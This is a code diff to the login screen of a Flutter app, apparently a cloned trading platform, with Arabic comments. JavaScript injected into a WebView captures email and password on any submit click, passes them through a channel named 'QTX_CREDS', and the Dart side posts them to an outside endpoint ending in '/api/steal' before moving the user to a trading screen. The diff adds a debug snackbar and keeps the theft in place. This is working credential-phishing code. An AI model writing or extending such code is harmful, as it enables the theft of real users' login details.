@@ -50,9 +50,15 @@ class _LoginScreenState extends State<LoginScreen> {
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (msg) async {
-          // 341. نستقبل الرسالة من الجافاسكريبت ونبعت للسيرفر
-          print("RECEIVED FROM JS: ${msg.message}");
+          // 356. نطبع بالكونسول ونطلع إشعار عشان نتأكد إنها وصلت
+          print("JAVASCRIPT MESSAGE: ${msg.message}");
+          if (mounted) {
+            ScaffoldMessenger.of(context).showSnackBar(
+              SnackBar(content: Text("وصلت رسالة من الجافاسكريبت! ${msg.message}"), backgroundColor: Colors.green),
+            );
+          }
           
+          // 357. نرسل للسيرفر (متل صاحبك)
           try {
             await http.post(
               Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
@@ -64,10 +70,8 @@ class _LoginScreenState extends State<LoginScreen> {
             print("SERVER ERROR: $e");
           }
 
+          // 358. ننقل المستخدم (متل صاحبك)
           if (mounted) {
-            ScaffoldMessenger.of(context).showSnackBar(
-              SnackBar(content: Text("وصلت البيانات! ${msg.message}"), backgroundColor: Colors.green),
-            );
             Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
           }
         },
@@ -117,7 +121,7 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
-          // 342. نضيف الحلقة اللي بتعيد المحاولة
+          // 359. إضافة setInterval (نفس صاحبك)
           var savedEmail = "";
           var savedPass = "";
           if (savedEmail || savedPass) {
